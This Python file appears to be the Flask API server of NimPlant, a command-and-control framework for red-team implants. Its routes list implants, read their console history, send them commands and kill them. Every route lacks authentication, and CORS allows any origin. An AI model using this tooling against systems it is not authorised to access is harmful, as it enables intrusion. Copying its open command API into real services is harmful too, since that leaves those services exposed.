import logging
import sys
import json
from threading import Thread
import re

import flask
from flask_cors import CORS
from ..util.config import config
from ..util.crypto import randString
from ..util.func import tailNimPlantLog, exitServer
from ..util.nimplant import nps
from ..util.config import config

from .formatting import reformat_config
from .helpers import json_response, ok_response, handle_incoming_command

# Parse server configuration
server_ip = config['server']['ip']
server_port = config['server']['port']

# Initiate flask app
app = flask.Flask(__name__, static_folder="../web/static", template_folder="../web")
app.secret_key = randString(32)

# Suppress logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None


# Define the API server
def api_server():
    # Get server configuration
    @app.route('/api/server', methods=['GET'])
    def get_server_info():
        server_info = {"guid": nps.guid, "name": nps.name, "config": reformat_config(config)}
        return json_response(app, server_info)

    # Get the last X lines of console history
    @app.route('/api/server/console', methods=['GET'])
    @app.route('/api/server/console/<lines>', methods=['GET'])
    def get_server_console(lines=500):
        console = tailNimPlantLog(lines=int(lines))

        return json_response(app, console)

    # Exit the server
    @app.route('/api/server/exit', methods=['POST'])
    def post_exit_server():
        Thread(target=exitServer).start()
        return ok_response(app, "Exiting server...")

    # Get all active nimplants with basic information
    @app.route('/api/nimplants', methods=['GET'])
    def get_nimplants():
        return json_response(app, nps.get_info())

    # Get a specific nimplant with its details
    @app.route('/api/nimplants/<guid>', methods=['GET'])
    def get_nimplant(guid):
        np = nps.getNimPlantByGuid(guid)
        return json_response(app, np.get_info())

    # Get the last X lines of console history for a specific nimplant
    @app.route('/api/nimplants/<guid>/console', methods=['GET'])
    @app.route('/api/nimplants/<guid>/console/<lines>', methods=['GET'])
    
    def get_nimplant_console(guid, lines=500):
        np = nps.getNimPlantByGuid(guid)

        data = {
            "nimplant": np.get_info() if np else None,
            "console": tailNimPlantLog(np, int(lines)),
        }

        return json_response(app, data)

    # Get the last X lines of console history for a specific nimplant
    @app.route('/api/nimplants/<guid>/history', methods=['GET'])
    @app.route('/api/nimplants/<guid>/history/<lines>', methods=['GET'])
    def get_nimplant_history(guid, lines=1500):
        np = nps.getNimPlantByGuid(guid)
        console = tailNimPlantLog(np, int(lines))
        command_matcher = re.compile("NimPlant[\\s\\d]+\\$ >(.+)\\n", re.MULTILINE)

        history = []

        for match in command_matcher.finditer(console["result"]):
            history.append(match.group(1).strip())

        data = {
            "nimplant": np.get_info() if np else None,
            "history": history,
        }

        return json_response(app, data)

    # Issue a command to a specific nimplant
    @app.route('/api/nimplants/<guid>/command', methods=['POST'])
    def post_nimplant_command(guid):
        np = nps.getNimPlantByGuid(guid)

        data = flask.request.json
        command = data["command"]

        return handle_incoming_command(app, np, command)

    # Exit the nimplant — just a convenience
    @app.route('/api/nimplants/<guid>/exit', methods=['POST'])
    def post_nimplant_exit(guid):
        np = nps.getNimPlantByGuid(guid)

        return handle_incoming_command(app, np, "kill")

    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        return flask.render_template("index.html")

    CORS(app, resources={r"/*": {"origins": "*"}})
    app.run(host=server_ip, port=server_port)
